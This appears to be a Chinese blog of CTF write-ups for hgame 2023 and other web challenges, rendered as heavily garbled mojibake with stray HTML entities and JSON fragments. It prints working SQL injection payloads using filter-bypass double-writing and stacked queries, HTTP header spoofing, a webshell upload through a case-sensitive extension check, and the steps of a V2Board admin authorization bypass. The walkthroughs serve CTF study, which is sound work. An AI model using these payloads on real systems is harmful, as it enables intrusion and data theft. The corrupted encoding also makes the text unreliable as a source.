Gameé¢˜ç›®åœ°å€\nå…”å…”æœ€è¿‘è¿·ä¸Šäº†ä¸€ä¸ªçº¯å‰ç«¯å®ç°çš„ç½‘é¡µå°æ¸¸æˆï¼Œä½†æ˜¯å¥½åƒæœ‰ç‚¹éš¾ç©ï¼Œå¿«å¸®å…”å…”é€šå…³æ¸¸æˆï¼è¿›å»è¿ç¬¬äºŒå…³éƒ½å…³ä¸äº†ï¼Œçƒ¦æ­»å•¦ã€‚è¿™ç§æ¸¸æˆç±»çš„é¢˜ç›®å¾€å¾€ä¼šè®©Flagåœ¨æ¸¸æˆé€šå…³åå‘ˆç°ï¼Œè€Œè¿™é“çº¯å‰ç«¯å®ç°çš„å°æ¸¸æˆï¼ŒFlagå°±å¾ˆæœ‰å¯èƒ½å°±è—åˆ°äº†jsä»£ç é‡Œã€‚\næˆ‘ä»¬æ£€æŸ¥æŸ¥çœ‹è„šæœ¬ï¼Œæ‰¾åˆ°å…³å¡Events.jsï¼Œç›´æ¥çœ‹åˆ°æœ€åä¸€å…³\n\n\nåœ¨â€œé€šå…³â€çš„æç¤ºåï¼Œè°ƒç”¨äº†ä¸€ä¸ªå«mota()å‡½æ•°ï¼Œé‡Œé¢å­˜åœ¨å¯ç–‘å˜é‡aï¼Œå¯èƒ½æ˜¯flag\nvar a = [&#x27;\\x59\\x55\\x64\\x6b\\x61\\x47\\x4a\\x58\\x56\\x6a\\x64\\x61\\x62\\x46\\x5a\\x31\\x59\\x6d\\x35\\x73\\x53\\x31\\x6c\\x59\\x57\\x6d\\x68\\x6a\\x4d\\x6b\\x35\\x35\\x59\\x56\\x68\\x43\\x4d\\x45\\x70\\x72\\x57\\x6a\\x46\\x69\\x62\\x54\\x55\\x31\\x56\\x46\\x52\\x43\\x4d\\x46\\x6c\\x56\\x59\\x7a\\x42\\x69\\x56\\x31\\x59\\x35&#x27;]\n\næˆ‘ä»¬å¯¹å…¶Hexè½¬ASCIIç ï¼Œå¾—åˆ°ä¸€ä¸ªåƒæ˜¯Base64ç¼–ç çš„ä¸œè¥¿\nYUdkaGJXVjdabFZ1Ym5sS1lYWmhjMk55YVhCMEprWjFibTU1VFRCMFlVYzBiV1Y5\n\næˆ‘ä»¬ç»§ç»­å¯¹å…¶è½¬æ¢ï¼Œå…¶ç»“æœä»æ˜¯Base64ç¼–ç ï¼Œå†è½¬æ¢ä¸€æ¬¡å°±å¾—åˆ°Flag\n\n\n\nä¹Ÿå¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°æ‰§è¡Œmota()å‡½æ•°ï¼Œç§’æ€ã€‚\n\nT2 [hgame 2023]Become A Memberé¢˜ç›®åœ°å€\nè¦æ±‚æˆ‘ä»¬â€œæä¾›ä¸€ä¸‹èº«ä»½è¯æ˜ï¼ˆCute-Bunnyï¼‰â€ï¼Œè€ƒå¯ŸHTTPçŸ¥è¯†ã€‚æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹\n\n\nå¯ä»¥çœ‹åˆ°å“åº”åŒ…å¤´éƒ¨ä¿¡æ¯Set-Cookieä¸­è®¾ç½®code=guestï¼Œæˆ‘ä»¬è¦æˆä¸ºä¼šå‘˜ï¼Œå¯èƒ½è¦ä¿®æ”¹è¿™ä¸ªå€¼ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¿®æ”¹æˆä»€ä¹ˆï¼Œæ•°æ¬¡å°è¯•æ— æœï¼Œè€ƒè™‘ä¿®æ”¹User-Agentä¸ºä»–ç»™å®šçš„Cute-Bunny\n\n\nå‘Šè¯‰æˆ‘ä»¬éœ€è¦â€œæŒæœ‰åä¸ºVidarçš„é‚€è¯·ç ï¼ˆcodeï¼‰â€ï¼Œåœ¨cookieä¸­æ·»åŠ code=Vidarï¼Œè®¿é—®åå‘ŠçŸ¥æˆ‘ä»¬â€œç”±äºç‰¹æ®ŠåŸå› ï¼Œæˆ‘ä»¬åªæ¥æ”¶æ¥è‡ªäºbunnybunnybunny.comçš„ä¼šå‘˜èµ„æ ¼ç”³è¯·â€ï¼Œè¿™é‡Œåªéœ€è¦å†æ·»åŠ Referer:bunnybunnybunny.comå³å¯ï¼Œæœ€åæ ¹æ®æç¤ºæ·»åŠ æœ¬åœ°è¯·æ±‚X-Forwarded-For:127.0.0.1ï¼Œæ‹¿åˆ°ä¼šå‘˜è´¦å·\nusername:luckytoday password:happy123ï¼ˆè¯·ä»¥jsonè¯·æ±‚æ–¹å¼ç™»é™†ï¼‰\n\næ³¨æ„jsonæ ¼å¼æäº¤æ•°æ®ï¼ŒæˆåŠŸæ‹¿åˆ°flagï¼Œæœ€ç»ˆè¯·æ±‚åŒ…å¦‚ä¸‹ï¼š\nGET / HTTP/1.1Host: week-1.hgame.lwsec.cn:31906Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUser-Agent: Cute-Bunny              # ä¿®æ”¹ä»£ç†Cookie:code=Vidar                   # ä¿®æ”¹cookieX-Forwarded-For:127.0.0.1           # æ·»åŠ  HTTPè¯·æ±‚ç«¯çœŸå®IP ä¸ºæœ¬åœ°Referer:bunnybunnybunny.com         # ä¿®æ”¹è®¿é—®æ¥æºContent-Type:application/json       # ä¿®æ”¹æ•°æ®æ ¼å¼ä¸ºjsonContent-Length: 59                                    # è¯·æ±‚å¤´éƒ¨åé¢çš„ç©ºè¡Œæ˜¯å¿…é¡»è¦æœ‰çš„&#123;                                   # jsonæ ¼å¼æ•°æ®\t&quot;username&quot;:&quot;luckytoday&quot;,\t&quot;password&quot;:&quot;happy123&quot;&#125;\n\n\nHttpåè®®&#x2F;JSONæ ¼å¼\n\n2023-01-14 WP\nT3 [hgame 2023]Guess Who I Amé¢˜ç›®åœ°å€\nçˆ¬è™«é¢˜ï¼Œå†™è„šæœ¬ç­”å¯¹100é¢˜å°±è¡Œäº†ã€‚ç”±äºé¢˜ç›®Questionã€Scoreä¿¡æ¯æ˜¯ç”±jsæ¸²æŸ“åå‘ˆç°ï¼Œå…¶è¿‡ç¨‹å¤§æ¦‚æ˜¯è¯·æ±‚ç½‘é¡µï¼Œç”±getQuestionå’ŒgetScoreåˆ†åˆ«åˆ›å»ºcookieï¼Œç”Ÿæˆsessionè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç„¶åå®¢æˆ·ç«¯å¸¦ç€sessionä¿¡æ¯å†å»è¯·æ±‚getQuestionå’ŒgetScoreåˆ†åˆ«è·å–Questionå’ŒScoreï¼Œç„¶åä»¥POSTè¯·æ±‚çš„æ–¹å¼å‘é€idåˆ°verifyAnsweråˆ¤æ–­å›ç­”æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ­£ç¡®ï¼Œåˆ™åœ¨å“åº”åŒ…set-cookieä¿®æ”¹sessionå€¼ï¼Œå‘å›ç»™å®¢æˆ·ç«¯ã€‚\n\n\nå› æ­¤è¦åšåˆ°100åˆ†ï¼Œè¦ä¹ˆæˆ‘ä»¬èƒ½ç›´æ¥å¯¹sessionè¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºåŠ äº†å¯†ï¼Œè¿™ä¸€ç‚¹æ˜¾ç„¶æ²¡æ³•å®ç°ï¼›è¦ä¹ˆå°±åªèƒ½æ¯æ¬¡è·å–cookieï¼Œç„¶åä¿®æ”¹cookieï¼Œæ¨¡æ‹Ÿå…¶è¿‡ç¨‹ã€‚æˆ‘æœ€åˆæƒ³å°è¯•è¿™ç§åšæ³•ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰è¯·æ±‚åˆ°getQuestionå’ŒgetScoreï¼Œè€Œæ²¡æœ‰è·å–åˆ°cookieï¼Œå°±æ”¾å¼ƒäº†ï¼ˆè¿™ä¹Ÿæ˜¯åæ¥å†åˆ†æçš„æ—¶å€™å¼„æ˜ç™½çš„ï¼‰ã€‚åé¢å†å¯¹è¿™ç§æ–¹æ³•çš„å®ç°åšè¡¥å……ã€‚\nPython + Selenium æ–¹æ³•è¿™é‡Œç”¨Python + Seleniumæ–¹æ³•ç™»å½•ç½‘é¡µï¼Œå€ŸåŠ©browserå®ç°æ•°æ®çš„æŠ“å–å’Œå‘é€ï¼Œä»¥åŠæ¨¡æ‹Ÿç‚¹å‡»ç­‰ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š\nimport timefrom selenium import webdriverfrom selenium.webdriver.common.by import Byimport redef getDict(filename):    f = open(filename, encoding=&#x27;utf-8&#x27;)    data = f.read()    id_re = re.compile(r&#x27;&quot;id&quot;: &quot;(.+?)&quot;&#x27;)    intro_re = re.compile(r&#x27;&quot;intro&quot;: &quot;(.+?)&quot;&#x27;)    id = id_re.findall(data)    intro = intro_re.findall(data)    dic = dict(zip(intro, id))    return dicdef solve(url, dic):    # æ‰“å¼€æµè§ˆå™¨    browser = webdriver.Firefox()    # æ‰“å¼€è¦è®¿é—®çš„é¡µé¢    browser.get(url)    for i in range(100):        # åˆ·æ–°        browser.refresh()        time.sleep(2)        # xpathè·å–é—®é¢˜        key = browser.find_element(By.XPATH, &#x27;/html/body/div/div[2]/h2[1]&#x27;).text[25:]        # å®šä½inputæ¡†        solve_input = browser.find_element(By.XPATH, &#x27;/html/body/div/div[2]/div/div/div[1]/div/input&#x27;)        # å½•å…¥id        solve_input.send_keys(dic[key])        # æ¨¡æ‹Ÿç‚¹å‡»        btn = browser.find_element(By.XPATH, &#x27;/html/body/div/div[2]/div/button&#x27;)        btn.click()        # ç»™2ç§’ååº”æ—¶é—´        time.sleep(2)        # æ¨¡æ‹Ÿå–æ¶ˆå¼¹çª—        browser.switch_to.alert.dismiss()        if i == 99:            print(browser.page_source)# ä»é¡µé¢æºç ä¸­æ‰¾åˆ°å…¨å‘˜ä¿¡æ¯filename = &#x27;hint.txt&#x27;dic = getDict(filename)url = &quot;http://week-1.hgame.lwsec.cn:30642&quot;solve(url, dic)\n\nè¿‡ç¨‹ä¸­å¤±è´¥äº†å‡ æ¬¡ï¼Œå‘ç°ä»–ç»™çš„member.jsä¸­éƒ¨åˆ†idå¤šäº†å‡ ä¸ªç©ºæ ¼â€¦â€¦ä¿®æ”¹åæˆåŠŸè·å–flag\n\n\n\nSeleniumçš„å®‰è£…ä¸Firefoxé…ç½®ä»¥åŠSeleniumåŸºæœ¬ç”¨æ³•(è¶…è¯¦ç»†)Selenium Python æ•™ç¨‹\n\nrequestsæ¨¡å—sessionæ–¹æ³•åé¢æŸ¥çœ‹äº†å®˜æ–¹ç»™çš„wpï¼Œåˆ†æåå‘ç°sessionæ–¹æ³•ä¿å­˜cookieï¼Œæ¨¡æ‹Ÿå…¶å®ç°è¿‡ç¨‹ç¡®å®å¯è¡Œã€‚ä¸‹é¢ç»™å‡ºæˆ‘å†™çš„è„šæœ¬ï¼š\ndef solution(url, dic):    s = requests.Session()    # å‘é€è¯·æ±‚ï¼Œè·å–cookieï¼Œå¹¶ä¿å­˜cookie    s.get(url+r&#x27;/api/getQuestion&#x27;)    for i in range(100):        # è·å–Question        res = s.get(url+r&#x27;/api/getQuestion&#x27;)        key = json.loads(res.text)[&#x27;message&#x27;]        # å‘é€Postè¯·æ±‚ï¼Œè‹¥æ­£ç¡®ï¼Œåˆ™è‡ªåŠ¨ä¿®æ”¹cookie        data = &#123;&#x27;id&#x27;: dic[key]&#125;        s.post(url+r&#x27;/api/verifyAnswer&#x27;, data=data)        # è·å–Score(å¸¦ç€Cookieè®¿é—®ä¸ä¼šset-cookie)        res1 = s.get(url+r&#x27;/api/getScore&#x27;)        print(&#x27;Score&#x27;, json.loads(res1.text)[&#x27;message&#x27;])url = &quot;http://week-1.hgame.lwsec.cn:30277&quot;solution(url, dic)\nåœ¨æ ¼å¼ä¸ŠåºŸäº†å¾ˆå¤§çš„åŠ²å„¿ï¼Œæˆ‘æ‰‹åŠ¨copyä¸‹æ¥çš„çš„â€hint.txtâ€æ˜¯ç”¨â€utf-8â€ç¼–ç çš„ï¼Œè€Œè¿”å›çš„res.textJSONæ ¼å¼å­—ç¬¦ä¸²ä¸­çš„æŸç‰¹æ®Šå­—ç¬¦è¢«å¤„ç†æˆå…¶unicodeç¼–ç ï¼Œç›´æ¥å¯¹å…¶ç”¨æ­£åˆ™è¡¨è¾¾å¼å¾—åˆ°çš„Introï¼Œä¸â€hint.txtâ€ä¸­çš„ä¸å®Œå…¨ç›¸åŒï¼Œæ€»æ˜¯æ˜¾ç¤ºâ€KeyErrorâ€ã€‚ï¼ˆç›®å‰è¿˜æ²¡æœ‰å¼„æ˜ç™½æ˜¯ä¸æ˜¯è¿™ä¸ªåŸå› ï¼Œæ±‚è§£ç­”ï¼‰\nåœ¨ç»™å‡ºçš„wpä¸­çœ‹åˆ°json.loads()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•èƒ½è§£ç  JSON æ•°æ®ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œè¿”å› Python å­—æ®µçš„æ•°æ®ç±»å‹ï¼Œå°è¯•äº†ä¸‹ï¼ŒæˆåŠŸæ‹¿åˆ°flagï¼š\n\n\n\nçˆ¬è™«â€”â€”cookieæ¨¡æ‹Ÿç™»é™†\n\nT4 [hgame 2023]Show Me Your Beautyé¢˜ç›®åœ°å€\næ–‡ä»¶ä¸Šä¼ é¢˜ã€‚ç»™äº†æˆ‘ä»¬å‰ç«¯JSä»£ç ï¼Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†è´´åœ¨ä¸‹é¢\nfunction post() &#123;    var file = document.getElementById(&quot;file&quot;);    //console.log(file.files[0].name)    var ext = file.value.toLowerCase().substr(file.value.lastIndexOf(&quot;.&quot;));    if (!/\\.(?:jpg|png|gif)$/.test(ext)) &#123;      alert(&quot;Invalid file extensions!&quot;);      return false;    &#125; else \t...&#125;\n\nå¯ä»¥çœ‹åˆ°å‰ç«¯è¿‡æ»¤æ‰äº†jpg|png|gifä»¥å¤–çš„å…¶ä»–åç¼€åï¼Œå› ä¸ºæ˜¯å‰ç«¯ï¼Œå…ˆä¸Šä¼ å›¾ç‰‡é©¬webshell.jpgï¼Œå†æŠ“åŒ…ä¿®æ”¹åç¼€å°±è¡Œäº†ã€‚\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¿˜æ˜¯è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯æˆ‘æƒ³åˆ°ä¼ ä¸€ä¸ª.htaccessè¯•è¯•ï¼Œç»“æœä¹Ÿè¢«è¿‡æ»¤äº†ã€‚å»å·å…¶ä»–wpçš„æ€è·¯ï¼Œå‘ç°æ–‡ä»¶åç¼€çš„æ£€æŸ¥å¯¹äºå¤§å°å†™ç«Ÿç„¶æ˜¯æ•æ„Ÿçš„ï¼Œç›´æ¥æ”¹ä¿®æ”¹åç¼€ä¸º.PHPæˆåŠŸç»•è¿‡æ£€æŸ¥ä¸Šä¼ ï¼Œå¹¶è¿”å›ï¼š\n&#123;&quot;json&quot;:&quot;Upload Successfully! .\\/img\\/webshell.PHP  5s\\u540e\\u9875\\u9762\\u81ea\\u52a8\\u5237\\u65b0&quot;&#125;\n\nç›´æ¥èšå‰‘è¿æ¥ä¸€ä¸‹ï¼Œæ‰¾åˆ°Flagï¼ˆæ³¨æ„ä¸€ä¸ªç‚¹ï¼Œwebshellè¿æ¥å¯†ç æœ‰æ—¶å€™ä¸åŠ å¼•å·â€™â€™å¯èƒ½ä¼šè¿æ¥å¤±è´¥ï¼‰ã€‚\nT5 [hgame 2023]Git Leakageé¢˜ç›®åœ°å€\né¢˜ç›®åâ€œgitæ³„éœ²â€ï¼Œæˆ‘ä»¬ç›´æ¥http://week-2.hgame.lwsec.cn:31944/.git/æŸ¥çœ‹.gitæ–‡ä»¶ï¼Œæœç„¶æˆåŠŸè¿›å…¥ã€‚\nhooksï¼šå­˜æ”¾ä¸€äº›shellè„šæœ¬infoï¼šå­˜æ”¾ä»“åº“çš„å…¨å±€æ€§æ’é™¤æ–‡ä»¶ä¿¡æ¯logsï¼šä¿å­˜æ‰€æœ‰æ›´æ–°çš„å¼•ç”¨è®°å½•objectsï¼šå­˜æ”¾æ‰€æœ‰çš„gitå¯¹è±¡refsï¼šå­˜å‚¨æŒ‡å‘åˆ†æ”¯çš„æäº¤å¯¹è±¡çš„æŒ‡é’ˆconfigï¼šä»“åº“çš„é…ç½®ä¿¡æ¯indexï¼šæš‚å­˜åŒºï¼ˆäºŒè¿›åˆ¶ï¼‰HEADï¼šæ˜ å°„åˆ°refçš„å¼•ç”¨\n\nå€ŸåŠ©GitHackå·¥å…·ï¼Œé‡å»ºè¿˜åŸå·¥ç¨‹æºä»£ç ï¼Œç›´æ¥å¾—åˆ°æ–‡ä»¶â€Th1s_1s-flagâ€ï¼Œæ‰“å¼€è·å–flag:\n\n\n\n\n\n\nå·¥å…·GitHack-py3\n\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"é›†è®­WriteUp-2","url":"/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-2/","content":"2023-01-15 WP\nT1 [hgame 2023]v2boardé¢˜ç›®åœ°å€\né¢˜ç›®è€ƒå¯Ÿå»å¹´12æœˆä»½çš„ä¸€ä¸ªV2Board v1.6.1ç‰ˆæœ¬çš„Admin.phpè¶Šæƒè®¿é—®æ¼æ´ï¼ˆæ³¨å†Œä¸ªå·è¿›å»çœ‹çœ‹å°±ä¼šå‘ç°å·¦ä¸‹è§’çš„â€V2Board v1.6.1â€ï¼Œæ”¾bingä¸Šä¸€æŸ¥å°±èƒ½çœ‹åˆ°ï¼‰ã€‚å…¶åŸç†è¿™é‡Œå°±ä¸èµ˜è¿°ï¼Œæ”¾ä¸€ä¸ªåˆ©ç”¨çš„è¿‡ç¨‹ï¼š\n\nä»»æ„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œé€šè¿‡/api/v1/passport/auth/loginæ¥å£ç™»å½•æ—¶ç”¨æŠ“åŒ…å·¥å…·è·å–å“åº”åŒ…çš„auth_data\n\n\n\n\nç„¶åè®¿é—®/api/v1/user/infoæ¥å£ï¼Œå¹¶å°†ä¸Šè¿°è·å¾—çš„auth_dataä½œä¸ºauthorizationå¤´å‘é€ï¼Œè¿™ä¸€æ­¥çš„ç›®çš„æ˜¯è®©æœåŠ¡å™¨å°†æ™®é€šç”¨æˆ·çš„Authorizationå¤´å†™å…¥ç¼“å­˜ä¸­ï¼ˆäº‹å®ä¸Šè¿™é‡Œè‡ªåŠ¨å®ç°äº†ï¼Œauth_data ä¼šéšç€ç™»å½•ç¼“å­˜äº Redis ï¼‰\n\n\n\n\næœ€ååªè¦å¸¦ä¸Šè¿™ä¸ªAuthorizationå¤´å³å¯è®¿é—®æ‰€æœ‰çš„ç®¡ç†å‘˜æ¥å£ï¼Œæ¯”å¦‚/api/v1/admin/user/fetchç­‰\n\n\n\nå¯ä»¥ç›´æ¥åœ¨ä¸Šå›¾æ‰¾åˆ°adminçš„è®¢é˜…tokenï¼ˆå¯¹ç€æºç æ‰¾æ¥å£æ‰¾äº†åŠå¤©ï¼Œä»¥ä¸ºè®¢é˜…ä¼šåœ¨planæ¥å£ä¸­ã€‚æ²¡æ³¨æ„åˆ°â€œä¼—æ‰€å‘¨çŸ¥v2boardçš„ç®¡ç†å‘˜ä¿¡æ¯å’Œç”¨æˆ·ä¿¡æ¯éƒ½åœ¨userè¡¨ï¼Œä»…ç”¨is_adminå­—æ®µåŒºåˆ†æ˜¯å¦ç®¡ç†å‘˜â€ï¼Œçº¯çº¯å¤§æ€¨ç§ï¼‰\n\nè·¯ç”±æ¥å£æºç V2Board Admin.php è¶Šæƒè®¿é—®æ¼æ´v2board v.1.6.1 æœºåœºé¢æ¿ç®¡ç†æ¥å£è¶Šæƒæ¼æ´åˆ†æ\n\n2023-01-23 WP\nT2 [hgame 2023]Search Commodityé¢˜ç›®åœ°å€\nå¼±å¯†ç ç™»å½•ï¼Œæ‰¾ä¸ªå­—å…¸ç”¨Burp Suiteæš´åŠ›ç ´è§£ä¸€ä¸‹å°±å¥½ï¼Œå¯†ç æ¯”è¾ƒå¸¸è§ï¼š\nç”¨æˆ·å:user01å¯†  ç :admin123\n\nâ€œç®€æ˜“çš„æŸ¥è¯¢é¢æ¿ï¼Œåªéœ€è¦è¾“å…¥idæ•°å­—ï¼Œå°±å¯ä»¥æŸ¥åˆ°å…”å…”æœ€è¿‘ä¹°çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬å¹´è´§ï¼‰â€ï¼Œä»é¢˜ç›®æè¿°åŸºæœ¬ä¸Šèƒ½å¤Ÿåˆ¤æ–­è€ƒå¯Ÿsqlæ³¨å…¥ï¼Œä½†æ˜¯ä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œéœ€è¦è‡ªå·±æµ‹è¯•ã€‚å…ˆæŒ‰è¦æ±‚è¾“å…¥idæ•°å­—1ï¼ŒæŸ¥è¯¢ç»“æœä¸ºhard disk 1ï¼Œç„¶åè¯•ä¸€è¯•and 1ï¼ŒæŸ¥è¯¢ç»“æœä¸å˜ï¼Œä¸éš¾çŒœæµ‹æ˜¯å°†éƒ¨åˆ†å…³é”®å­—ç”¨replaceæ›¿æ¢æ‰äº†ï¼Œè¿™è·Ÿæˆ‘ä¸Šä¸€å‘¨é‡åˆ°çš„sqlé¢˜([æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL)å¾ˆåƒã€‚åŒæ ·çš„åŠæ³•å¯ä»¥æµ‹å‡ºéƒ¨åˆ†æˆ‘ä»¬å°†è¦ç”¨åˆ°çš„å…¶ä»–è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼š\nand, or, select, union, from, where, database, =, /**/, &lt;, &gt;\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼šè¾“å…¥o r1æŸ¥è¯¢ç»“æœä¸å˜ã€‚å¯èƒ½æ˜¯å…ˆå¯¹è¾“å…¥çš„å†…å®¹ä¸­æ‰€æœ‰çš„ç©ºæ ¼è¿›è¡Œäº†å»é™¤ï¼Œç„¶åå†å¯¹å…¶ä»–å­—ç¬¦è¿›è¡ŒäºŒæ¬¡è¿‡æ»¤ã€‚ç»•è¿‡ç©ºæ ¼å¯ä»¥ä½¿ç”¨æ³¨é‡Šç¬¦/**/å’Œæ‹¬å·()ã€‚ä¹‹åå†ç”¨åŒå†™ç»•è¿‡å³å¯ã€‚\nçˆ†å­—æ®µæ•°\n0//**/**/oorrder//**/**/by//**/**/4#                    //æµ‹è¯•ä¸º4æ—¶æŠ¥é”™ï¼Œæ•…å­—æ®µæ•°ä¸º3\n\nåˆ¤æ–­å›æ˜¾ä½ä¸º2, 3\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,2,3#   \n\nçˆ†åº“åä¸ºse4rchï¼Œå¾ˆå¥‡æ€ªï¼Œè¿™é‡Œåªèƒ½æŠŠåº“åæ”¾ç¬¬äºŒä¸ªå›æ˜¾ä½ï¼Œå¦åˆ™å›æ˜¾Not Found 0ï¼Œç•™ä¸ªç–‘é—®ã€‚\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,ddatabaseatabase(),3#                           \n\nçˆ†è¡¨åï¼Œâ€™&#x3D;â€™å¯ä»¥ç”¨â€™likeâ€™æˆ–â€™!&lt;&gt;â€™ç»•è¿‡ï¼Œå¾—åˆ°â€5ecret15here,L1st,user1nf0â€\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(table_name),3/*/**/*/ffromrom(infoorrmation_schema.tables)wwherehere(table_schema//**/**/like//**/**/ddatabaseatabase())#\n\nçˆ†å­—æ®µåï¼Œå¾—åˆ°â€f14gggg1shereâ€\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(column_name),3/*/**/*/ffromrom(infoorrmation_schema.columns)wwherehere(table_name//**/**/like//**/**/&#x27;5ecret15here&#x27;)#\n\nçˆ†æ•°æ®\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(f14gggg1shere),3/*/**/*/ffromrom(5ecret15here)#\n\næˆåŠŸæ‹¿åˆ°Flag:\nhgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;\n\nT3 [hgame 2023]Designeré¢˜ç›®åœ°å€\né¢˜ç›®ç»™äº†æºç ã€‚\n2023-01-23 WP\nT4 [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨é¢˜ç›®åœ°å€\næ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼Œå…ˆç”¨1&#39;åˆ¤æ–­ä¸€ä¸‹é—­åˆæ–¹å¼ï¼Œå›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼š\nerror 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1\n\næ˜¯ç”¨å•å¼•å·&#39;é—­åˆï¼Œä¸‡èƒ½å¯†ç 1&#39; or 1=1#èƒ½çˆ†å‡ºæ‰€æœ‰æ•°æ®ã€‚ä¸‹é¢æŒ‰éƒ¨å°±ç­çš„çˆ†å­—æ®µæ•°(ä¸¤ä¸ªå­—æ®µ)ï¼š\n1&#x27; order by 3#\n\nä½†æ˜¯åœ¨çˆ†è¡¨åçš„æ—¶å€™å‘ç°selectè¢«è¿‡æ»¤äº†ï¼Œä¸”å¤§å°å†™ç»•è¿‡æ— æ•ˆã€‚\nreturn preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);\n\nå †å æ³¨å…¥å­¦ä¹ (å †å æŸ¥è¯¢ï¼ŒStacked Queries)è”åˆæŸ¥è¯¢ä¸å¯ç”¨ï¼Œè¿™é‡Œè¡¥å……ä¸€ä¸‹å †å æŸ¥è¯¢çš„çŸ¥è¯†ã€‚å †å æ³¨å…¥ä¸ºæ”»å‡»è€…æä¾›äº†å¾ˆå¤šæ§åˆ¶æƒï¼Œä¸ä»…é™äºSELECTè¯­å¥çš„UNIONè”åˆæŸ¥è¯¢æ”»å‡»ä¸åŒï¼Œå †å æ³¨å…¥å¯ä»¥ç”¨äºæ‰§è¡Œä»»ä½•SQLè¯­å¥ã€‚\nå †å æ³¨å…¥åŸç†åœ¨sqlä¸­ï¼Œåˆ†å·è¡¨ç¤ºä¸€æ¡è¯­å¥çš„ç»“æŸã€‚å¦‚æœåœ¨åˆ†å·çš„åé¢å†åŠ ä¸€æ¡è¯­å¥ï¼Œè¿™æ¡è¯­å¥ä¹Ÿå¯ä»¥è¢«æ‰§è¡Œï¼Œç»§ç»­åŠ ä¸€ä¸ªåˆ†å·å’Œä¸€æ¡è¯­å¥ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸€æ¬¡æ•°æ®åº“çš„è°ƒç”¨ä¸­æ‰§è¡Œå¤šä¸ªè¯­å¥ã€‚å¦‚ä¸‹å›¾:\n\n\nå †å æ³¨å…¥åˆ©ç”¨åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨1&#39;;show databases;#æŸ¥å‡ºåº“åï¼Œç”¨1&#39;;show tables;#æŸ¥å‡ºè¡¨å:\n\n\nç„¶åç”¨descæŸ¥è¡¨ç»“æ„ã€‚\n\nè¿™é‡Œè¡¥å……ä¸€ç‚¹ï¼Œæ‰€æœ‰æ•°æ®åº“å¯¹è±¡ï¼ˆæ•°æ®åº“åã€è¡¨åã€å­—æ®µåã€ç´¢å¼•åç­‰ï¼‰å‘½åç¦æ­¢ä½¿ç”¨MySQLä¿ç•™å…³é”®å­—ï¼Œå¦‚æœè¦ç”¨ï¼Œå°±å¿…é¡»åŠ ä¸Šåå¼•å·ã€‚å¯¹äºçº¯æ•°å­—çš„æ•°æ®åº“å¯¹è±¡ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™ã€‚\n\n\n\n1&#x27;;desc `1919810931114514`;#\n\nå¯¹â€™1919810931114514â€™è¡¨æŸ¥ä¸€ä¸‹ï¼Œæ‰¾åˆ°â€™flagâ€™å­—æ®µï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è¿›è¡ŒæŸ¥è¯¢ã€‚ä¸‹é¢1&#39;;desc words;#æŸ¥ä¸€ä¸‹â€™wordsâ€™çš„è¡¨ç»“æ„\n\n\nå¯ä»¥çœ‹åˆ°æ˜¯ä¸¤ä¸ªå­—æ®µï¼Œä¸€ä¸ªæ˜¯intå‹çš„idï¼Œå¦ä¸€ä¸ªæ˜¯varcharå‹çš„dataï¼Œåˆç»“åˆè¾“å…¥1æ—¶çš„æŸ¥è¯¢ç»“æœï¼Œä¸éš¾æ¨æµ‹å‡ºæäº¤çª—å£çš„æŸ¥è¯¢è¯­å¥å½¢å¦‚:\nselect id,data from words where id =\n\nã€‚å› æ­¤ï¼Œåªè¦æˆ‘ä»¬åˆ©ç”¨å †å æ³¨å…¥æ›´æ”¹â€™1919810931114514â€™è¡¨åä¸ºâ€™wordsâ€™ï¼Œå†æŠŠåˆ—åflagæ”¹æˆidï¼Œç„¶åç”¨æ—¢å®šçš„æŸ¥è¯¢åŠŸèƒ½æŸ¥è¯¢â€™wordsâ€™è¡¨ï¼Œå°±å¯ä»¥å®ç°å®é™…ä¸Šå¯¹â€™1919810931114514â€™è¡¨çš„æŸ¥è¯¢å•¦ã€‚\n# æ›´æ”¹åŸwordsè¡¨å:rename table words to bye;# æ›´æ”¹è¡¨å:rename table `1919810931114514` to words;# æ›´æ”¹å­—æ®µå: ã€ALTER TABLE &lt;è¡¨å&gt; CHANGE 